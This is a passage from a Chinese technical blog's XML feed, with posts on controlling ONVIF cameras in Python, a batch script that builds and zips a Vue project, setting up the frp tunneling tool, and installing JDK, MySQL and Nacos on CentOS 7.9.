class="hljs-keyword">in</span> codeStr <span class="hljs-keyword">else</span> (<br>                    PanTiltSpeed * -<span class="hljs-number">1.0</span> <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Left&#x27;</span> <span class="hljs-keyword">in</span> codeStr <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>)<br>                params = &#123;<br>                    <span class="hljs-string">&#x27;PanTilt&#x27;</span>: &#123;<br>                        <span class="hljs-string">&#x27;x&#x27;</span>: speedPan,<br>                        <span class="hljs-string">&#x27;y&#x27;</span>: speedTilt<br>                    &#125;<br>                &#125;<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">if</span> client.ZoomSpeedMax <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;当前设备不支持缩放控制&quot;</span>)<br>                ZoomSpeed = client.ZoomSpeedMax * <span class="hljs-built_in">float</span>(speed) / <span class="hljs-number">100.0</span><br>                speedZoom = <span class="hljs-number">0</span> <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Zoom&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> codeStr <span class="hljs-keyword">else</span> (<br>                    ZoomSpeed * -<span class="hljs-number">1.0</span> <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Wide&#x27;</span> <span class="hljs-keyword">in</span> codeStr <span class="hljs-keyword">else</span> ZoomSpeed)<br>                params = &#123;<br>                    <span class="hljs-string">&#x27;Zoom&#x27;</span>: speedZoom<br>                &#125;<br>            client.ptz_move(params)<br>    <span class="hljs-keyword">elif</span> codeStr <span class="hljs-keyword">in</span> focusList:<br>        <span class="hljs-keyword">if</span> client.MoveSpeedMax <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">if</span> status == <span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;当前设备不支持聚焦控制&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">if</span> status == <span class="hljs-number">0</span>:<br>            client.focus_move()<br>        <span class="hljs-keyword">else</span>:<br>            MoveSpeed = client.MoveSpeedMax * <span class="hljs-built_in">float</span>(speed) / <span class="hljs-number">100.0</span><br>            client.focus_move(MoveSpeed <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;FocusNear&#x27;</span> == codeStr <span class="hljs-keyword">else</span> MoveSpeed * -<span class="hljs-number">1.0</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">if</span> status == <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;该方式暂不支持&quot;</span>)<br></code></pre></td></tr></table></figure><p>调用方</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> json<br><br><br><span class="hljs-comment"># 设备发现</span><br><span class="hljs-built_in">print</span>(ws_discovery())<br><br>client = OnvifClient(<span class="hljs-string">&#x27;192.168.1.10&#x27;</span>, <span class="hljs-number">80</span>, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;123456&#x27;</span>, needSnapImg=<span class="hljs-literal">False</span>)<br><span class="hljs-comment"># 如果要控制特定摄像头，可以下边这样写</span><br><span class="hljs-comment"># client = OnvifClient(&#x27;192.168.1.10&#x27;, 80, &#x27;admin&#x27;, &#x27;123456&#x27;, token=&quot;ProfileToken002&quot;, sourceToken= &quot;VideoSourceToken002&quot;, nodeToken=&quot;NodeToken002&quot;, needSnapImg=False)</span><br><br><span class="hljs-comment"># 获取所有画面所有码流的RTSP地址、token(即ProfileToken)、sourceToken、nodeToken等信息</span><br><span class="hljs-built_in">print</span>(json.dumps(client.get_rtsp()))<br><br><span class="hljs-comment"># 获取设备信息</span><br><span class="hljs-built_in">print</span>(json.dumps(client.get_deviceInfo()))<br><br><span class="hljs-comment"># 设置时间</span><br>client.set_cam_time()<br><br><span class="hljs-comment"># 云台与聚焦控制</span><br><span class="hljs-comment"># 云台上移</span><br>ptzChangeByClient(client, <span class="hljs-string">&#x27;Up&#x27;</span>, <span class="hljs-number">1</span>)<br><span class="hljs-comment"># 移动一秒</span><br>time.sleep(<span class="hljs-number">1</span>)<br><span class="hljs-comment"># 然后停止</span><br>ptzChangeByClient(client, <span class="hljs-string">&#x27;Up&#x27;</span>, <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>Onvif</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>编写bat脚本实现对vue项目构建并压缩</title>
    <link href="/2023/09/newpost-53/"/>
    <url>/2023/09/newpost-53/</url>
    
    <content type="html"><![CDATA[<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>编写bat脚本自动完成代码更新、构建、压缩为日期命名的压缩包</p><span id="more"></span><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><h2 id="一、准备"><a href="#一、准备" class="headerlink" title="一、准备"></a>一、准备</h2><h3 id="1、npm-install"><a href="#1、npm-install" class="headerlink" title="1、npm install"></a>1、npm install</h3><p>通常<code>npm install</code>只要执行一次，就不写在脚本里了，所以需要预先执行过一次<code>npm install</code></p><h3 id="2、压缩工具"><a href="#2、压缩工具" class="headerlink" title="2、压缩工具"></a>2、压缩工具</h3><p>windows下需要一个压缩工具来实现命令压缩</p><p><a href="http://www.7-zip.org/download.html">官网</a>下载安装文件，安装完成后把安装目录的<code>7z.exe</code>和<code>7z.dll</code>复制到<code>C:\Windows\System32</code>目录下，如果不需要7z就可以卸载了</p><h2 id="二、脚本"><a href="#二、脚本" class="headerlink" title="二、脚本"></a>二、脚本</h2><p>项目根目录新建<code>打包.bat</code>文件，并编写如下</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bat"><span class="hljs-built_in">set</span> &quot;curr_date=<span class="hljs-variable">%date%</span>&quot;<br><span class="hljs-built_in">set</span> &quot;yy=<span class="hljs-variable">%curr_date:~0,4%</span>&quot;<br><span class="hljs-built_in">set</span> &quot;mn=<span class="hljs-variable">%curr_date:~5,2%</span>&quot;<br><span class="hljs-built_in">set</span> &quot;dd=<span class="hljs-variable">%curr_date:~8,2%</span>&quot;<br><span class="hljs-built_in">set</span> &quot;curr_time=<span class="hljs-variable">%time%</span>&quot;<br><span class="hljs-keyword">if</span> <span class="hljs-variable">%curr_time:~0,2%</span> <span class="hljs-keyword">leq</span> <span class="hljs-number">9</span> (<span class="hljs-built_in">set</span> hh=<span class="hljs-number">0</span><span class="hljs-variable">%curr_time:~1,1%</span>) <span class="hljs-keyword">else</span> (<span class="hljs-built_in">set</span> hh=<span class="hljs-variable">%curr_time:~0,2%</span>)<br><span class="hljs-built_in">set</span> &quot;mm=<span class="hljs-variable">%curr_time:~3,2%</span>&quot;<br><span class="hljs-built_in">set</span> &quot;ss=<span class="hljs-variable">%curr_time:~6,2%</span>&quot;<br><br><span class="hljs-built_in">set</span> &quot;newname=<span class="hljs-variable">%yy%</span><span class="hljs-variable">%mn%</span><span class="hljs-variable">%dd%</span>-<span class="hljs-variable">%hh%</span><span class="hljs-variable">%mm%</span><span class="hljs-variable">%ss%</span>.zip&quot;<br><br>git pull &amp;&amp; npm run build &amp;&amp; <span class="hljs-number">7</span>z a <span class="hljs-variable">%newname%</span> dist<br></code></pre></td></tr></table></figure><p>上边的名称可以自定义修改为自己想要的，例如改为<code>newname=%yy%%mn%%dd%-%hh%%mm%%ss%-prod.zip</code></p><p>如果想要压缩包根目录不是dist目录，直接是dist目录中的文件，最后一行可以改为</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bat">git pull &amp;&amp; npm run build &amp;&amp; <span class="hljs-built_in">cd</span> dist &amp;&amp; <span class="hljs-number">7</span>z a <span class="hljs-variable">%newname%</span> **<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
      <tag>前端</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网穿透工具frp快速使用</title>
    <link href="/2023/09/newpost-52/"/>
    <url>/2023/09/newpost-52/</url>
    
    <content type="html"><![CDATA[<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>通过简化的配置，实现内网穿透</p><span id="more"></span><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><h2 id="一、下载对应的工具"><a href="#一、下载对应的工具" class="headerlink" title="一、下载对应的工具"></a>一、下载对应的工具</h2><p>前往官方下载 <a href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p><h2 id="二、编辑配置文件"><a href="#二、编辑配置文件" class="headerlink" title="二、编辑配置文件"></a>二、编辑配置文件</h2><h3 id="1-服务端frps-ini"><a href="#1-服务端frps-ini" class="headerlink" title="1.服务端frps.ini"></a>1.服务端frps.ini</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-comment"># 服务端口</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7000</span><br><br><span class="hljs-comment"># 控制面板地址</span><br><span class="hljs-attr">dashboard_addr</span> = <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span><br><span class="hljs-comment"># 控制面板端口</span><br><span class="hljs-attr">dashboard_port</span> = <span class="hljs-number">7001</span><br><span class="hljs-comment"># 控制面板用户名</span><br><span class="hljs-attr">dashboard_user</span> = xxxxxx<br><span class="hljs-comment"># 控制面板密码</span><br><span class="hljs-attr">dashboard_pwd</span> = yyyyyyyy<br><br><br><span class="hljs-comment"># 鉴权方式</span><br><span class="hljs-attr">authentication_method</span> = token<br><span class="hljs-comment"># 鉴权秘钥</span><br><span class="hljs-attr">token</span> = zzzzzzzzz<br><span class="hljs-comment"># 日志文件</span><br><span class="hljs-attr">log_file</span> = /root/frp/frps.log<br><span class="hljs-comment"># 日志等级</span><br><span class="hljs-attr">log_level</span> = info<br><br><span class="hljs-comment"># 允许的端口范围</span><br><span class="hljs-attr">allow_ports</span> = <span class="hljs-number">7002</span>-<span class="hljs-number">7999</span><br></code></pre></td></tr></table></figure><h3 id="2-客户端frpc-ini"><a href="#2-客户端frpc-ini" class="headerlink" title="2.客户端frpc.ini"></a>2.客户端frpc.ini</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-comment"># 服务器地址</span><br><span class="hljs-attr">server_addr</span> = <span class="hljs-number">111.111</span>.<span class="hljs-number">111.111</span><br><span class="hljs-comment"># 服务端口</span><br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span><br><span class="hljs-comment"># 鉴权秘钥</span><br><span class="hljs-attr">token</span> = zzzzzzzzz<br><span class="hljs-comment"># 本机用户名，可随意填写，但不要和别人重复，用于区分和避免重名</span><br><span class="hljs-attr">user</span> = user001<br><br><span class="hljs-section">[ssh]</span> <span class="hljs-comment"># 这个名字随意，但不要重复，最好有明确意义方便一眼认出</span><br><span class="hljs-comment"># 类型</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-comment"># 本地ip，也可设为192.168.0.1等本地可以访问到的地址</span><br><span class="hljs-attr">local_ip</span> = <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><span class="hljs-comment"># 本地端口号</span><br><span class="hljs-attr">local_port</span> = <span class="hljs-number">22</span><br><span class="hljs-comment"># 远程端口号，注意，如果在服务端配置了【allow_ports】，这里端口号需要在范围内</span><br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">7022</span><br></code></pre></td></tr></table></figure><h2 id="三、启动"><a href="#三、启动" class="headerlink" title="三、启动"></a>三、启动</h2><h3 id="1-直接使用命令启动"><a href="#1-直接使用命令启动" class="headerlink" title="1.直接使用命令启动"></a>1.直接使用命令启动</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">./frps -c frps.ini # 服务端<br><br>./frpc -c frpc.ini # 客户端<br></code></pre></td></tr></table></figure><p>这种方法一旦关闭窗口则服务也会停止，或者你可以用下边的方法创建为服务</p><h3 id="2-创建为服务（CentOS7）"><a href="#2-创建为服务（CentOS7）" class="headerlink" title="2.创建为服务（CentOS7）"></a>2.创建为服务（CentOS7）</h3><p>以服务端为例，客户端同理</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim /usr/lib/systemd/system/frps.service<br></code></pre></td></tr></table></figure><p>假定你的frp可执行文件和配置都放在<code>/root/frp/</code>目录，否则请修改下面的路径为实际</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs systemd">[Unit]<br>Description=frps<br>After=network.target syslog.target<br><br>[Service]<br>Type=simple<br>ExecStart=/root/frp/frps -c /root/frp/frps.ini<br><br>[Install]<br>WantedBy=multi-user.target<br></code></pre></td></tr></table></figure><p>常用命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">重载配置文件（编辑或新增服务后执行）</span><br>systemctl daemon-reload<br><span class="hljs-meta prompt_"># </span><span class="language-bash">设置开机自启动</span><br>systemctl enable frps<br><span class="hljs-meta prompt_"># </span><span class="language-bash">启动</span><br>systemctl start frps<br><span class="hljs-meta prompt_"># </span><span class="language-bash">停止</span><br>systemctl stop frps<br><span class="hljs-meta prompt_"># </span><span class="language-bash">重启</span><br>systemctl restart frps<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看状态</span><br>systemctl status frps<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
      <tag>经验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CentOS 7.9 安装基础开发环境jdk redis nacos nginx mysql</title>
    <link href="/2023/05/newpost-51/"/>
    <url>/2023/05/newpost-51/</url>
    
    <content type="html"><![CDATA[<p>注意：以下环境基于CentOS 7.9 最小化（<code>Minimal</code>）系统（镜像文件名称为<code>CentOS-7-x86_64-Minimal-2207-02.iso</code>，988MB），其他系统或版本可能略有不同</p><p>系统下载链接：<a href="http://isoredirect.centos.org/centos/7/isos/x86_64/">CentOS Mirrors List</a></p><span id="more"></span><p>所用安装包以及系统，如果不方便在官网下载，可通过下边的方式下载</p><ul><li><p>百度网盘</p><p>链接：<a href="https://pan.baidu.com/s/1pAKhFt5kEfHmflH1d8z1Lw?pwd=yink">https://pan.baidu.com/s/1pAKhFt5kEfHmflH1d8z1Lw?pwd=yink</a> </p><p>提取码：yink</p></li><li><p>迅雷云盘</p><p>链接：<a href="https://pan.xunlei.com/s/VNV3oKC6Tsmy9sC2hKVaDTgPA1#">https://pan.xunlei.com/s/VNV3oKC6Tsmy9sC2hKVaDTgPA1#</a></p><p>提取码：xb9a</p></li></ul><h2 id="1、JDK-8"><a href="#1、JDK-8" class="headerlink" title="1、JDK 8"></a>1、JDK 8</h2><p>下载链接：<a href="https://www.oracle.com/java/technologies/downloads/#java8">Java Downloads | Oracle</a></p><p>下载rpm版，安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">rpm -ivh jdk-8u371-linux-x64.rpm<br></code></pre></td></tr></table></figure><p>安装后jdk路径为<code>/usr/java/jdk1.8.0-x64</code></p><p>如无特别需要，通过rpm方式安装的jdk无需额外配置环境变量</p><h2 id="2、MySQL-5-7"><a href="#2、MySQL-5-7" class="headerlink" title="2、MySQL 5.7"></a>2、MySQL 5.7</h2><p>yum安装可以参考<a href="https://cloud.tencent.com/developer/beta/article/1886339">centos7 安装 Mysql 5.7.28，详细完整教程-腾讯云开发者社区-腾讯云</a>，以下为普通安装，使用yum安装可以跳到2.3</p><p>下载链接：<a href="https://dev.mysql.com/downloads/mysql/">MySQL :: Download MySQL Community Server</a></p><p><strong>推荐5.7.42版本</strong></p><img src="/2023/05/newpost-51/2023-05-10-16-30-54-2023-05-10-09-36-18-image.png" class=""><h3 id="2-1-卸载已有mariadb"><a href="#2-1-卸载已有mariadb" class="headerlink" title="2.1 卸载已有mariadb"></a>2.1 卸载已有mariadb</h3><p>首先检查下系统是否有<code>mariadb</code>，有则卸载（注意把<code>mariadb-libs</code>换成自己搜索到的包名）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">rpm -qa |grep mariadb<br><br>rpm -e --nodeps mariadb-libs<br></code></pre></td></tr></table></figure><h3 id="2-2-安装"><a href="#2-2-安装" class="headerlink" title="2.2 安装"></a>2.2 安装</h3><p>下载后解压得到一堆rpm文件，用到其中的common、libs、client、server，先后安装如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">rpm -ivh mysql-community-common-5.7.42-1.el7.x86_64.rpm<br>rpm -ivh mysql-community-libs-5.7.42-1.el7.x86_64.rpm<br>rpm -ivh mysql-community-client-5.7.42-1.el7.x86_64.rpm<br>yum -y install perl.x86_64 # 如果已安装，无需此步<br>yum -y install net-tools.x86_64 # 如果已安装，无需此步<br>rpm -ivh mysql-community-server-5.7.42-1.el7.x86_64.rpm<br></code></pre></td></tr></table></figure><h3 id="2-3-设置开机自启并启动mysql"><a href="#2-3-设置开机自启并启动mysql" class="headerlink" title="2.3 设置开机自启并启动mysql"></a>2.3 设置开机自启并启动mysql</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl daemon-reload<br>systemctl enable mysqld<br>systemctl start mysqld<br></code></pre></td></tr></table></figure><h3 id="2-4-修改密码"><a href="#2-4-修改密码" class="headerlink" title="2.4 修改密码"></a>2.4 修改密码</h3><p>获取安装时默认的密码，最后冒号之后的就是密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">grep &#x27;temporary password&#x27; /var/log/mysqld.log<br></code></pre></td></tr></table></figure><p>登录并修改密码（初始密码不能进行其他操作）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">mysql -uroot -p<br><span class="hljs-meta prompt_"># </span><span class="language-bash">然后输入初始密码后回车</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">下边的操作解除密码规则限制</span><br>set global validate_password_policy=0;<br>set global validate_password_length=1;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">设置密码为`yourpassword`，替换为自己的密码</span><br>set password for root@localhost=password(&quot;yourpassword&quot;);<br><span class="hljs-meta prompt_"># </span><span class="language-bash">允许其他机器远程登录，记得把密码改成自己的</span><br>GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;yourpassword&#x27;;<br>FLUSH PRIVILEGES;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">退出mysql命令行</span><br>exit<br></code></pre></td></tr></table></figure><h3 id="2-5-修改配置文件"><a href="#2-5-修改配置文件" class="headerlink" title="2.5 修改配置文件"></a>2.5 修改配置文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim /etc/my.cnf<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cnf">[mysql]<br>default-character-set=utf8<br><br>[mysqld]<br>datadir=/var/lib/mysql<br>socket=/var/lib/mysql/mysql.sock<br>default-storage-engine=INNODB<br>character_set_server=utf8<br><br>symbolic-links=0<br><br>log-error=/var/log/mysqld.log<br>pid-file=/var/run/mysqld/mysqld.pid<br><br>sql_mode=STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION<br>lower_case_table_names=1<br></code></pre></td></tr></table></figure><p>重启mysql</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">service mysqld restart<br></code></pre></td></tr></table></figure><h3 id="2-6-防火墙开放3306端口"><a href="#2-6-防火墙开放3306端口" class="headerlink" title="2.6 防火墙开放3306端口"></a>2.6 防火墙开放3306端口</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">查看状态</span><br>firewall-cmd --state<br><span class="hljs-meta prompt_"># </span><span class="language-bash">开放端口</span><br>firewall-cmd --zone=public --add-port=3306/tcp --permanent<br><span class="hljs-meta prompt_"># </span><span class="language-bash">重载</span><br>firewall-cmd --reload<br></code></pre></td></tr></table></figure><h3 id="2-7-创建用户"><a href="#2-7-创建用户" class="headerlink" title="2.7 创建用户"></a>2.7 创建用户</h3><p>创建数据库并创建用户授权该数据库（先进入mysql命令行）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> validate_password_policy<span class="hljs-operator">=</span><span class="hljs-number">0</span>;<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> validate_password_length<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">create</span> database nacos;<br># 改为自己的密码<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">&#x27;nacos&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;yourpassword&#x27;</span>;<br><span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">all</span> privileges <span class="hljs-keyword">ON</span> `nacos`.<span class="hljs-operator">*</span> <span class="hljs-keyword">TO</span> <span class="hljs-string">&#x27;nacos&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span>;<br># 如果需要创建其他用户以及数据库，可以在此一并创建<br></code></pre></td></tr></table></figure><h2 id="3、naocs"><a href="#3、naocs" class="headerlink" title="3、naocs"></a>3、naocs</h2><p>下载链接：<a href="https://github.com/alibaba/nacos/releases">Releases · alibaba/nacos · GitHub</a></p><p><strong>推荐2.1.1版本，2.2之后的版本需要额外的秘钥配置</strong></p><h3 id="3-1-解压并移动"><a href="#3-1-解压并移动" class="headerlink" title="3.1 解压并移动"></a>3.1 解压并移动</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">tar -zxvf nacos-server-2.1.1.tar.gz<br>mv nacos /usr/local/nacos<br>cd /usr/local/nacos<br></code></pre></td></tr></table></figure><h3 id="3-2-初始化nacos数据库"><a href="#3-2-初始化nacos数据库" class="headerlink" title="3.2 初始化nacos数据库"></a>3.2 初始化nacos数据库</h3><p>进入mysql命令行，sql文件在<code>/usr/local/nacos/conf/nacos-mysql.sql</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">use naocs;<br>source <span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span><span class="hljs-keyword">local</span><span class="hljs-operator">/</span>nacos<span class="hljs-operator">/</span>conf<span class="hljs-operator">/</span>nacos<span class="hljs-operator">-</span>mysql.sql<br>exit<br></code></pre></td></tr></table></figure><h3 id="3-3-修改配置"><a href="#3-3-修改配置" class="headerlink" title="3.3 修改配置"></a>3.3 修改配置</h3><p><code>vi conf/application.properties</code>，把其中以下行解开注释，并配置自己的mysql信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">db.num=1<br><br>db.url.0=jdbc:mysql...<br>db.user.0=xxx<br>db.password.0=xxx<br><br>nacos.core.auth.enabled=true<br></code></pre></td></tr></table></figure><h3 id="3-4-把nacos做成服务并开机自启"><a href="#3-4-把nacos做成服务并开机自启" class="headerlink" title="3.4 把nacos做成服务并开机自启"></a>3.4 把nacos做成服务并开机自启</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim /lib/systemd/system/nacos.service<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs systemd">[Unit]<br>Description=nacos<br>After=network.target<br><br>[Service]<br>Type=forking<br>ExecStart=/usr/local/nacos/bin/startup.sh -m standalone<br>ExecReload=/usr/local/nacos/bin/shutdown.sh<br>ExecStop=/usr/local/nacos/bin/shutdown.sh<br>PrivateTmp=true<br><br>[Install]  <br>WantedBy=multi-user.target<br></code></pre></td></tr></table></figure><p>设置开机自启并启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl daemon-reload<br>systemctl enable nacos<br>systemctl start nacos<br></code></pre></td></tr></table></figure><h3 id="3-5-放开8848端口"><a href="#3-5-放开8848端口" class="headerlink" title="3.5 放开8848端口"></a>3.5 放开8848端口</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span 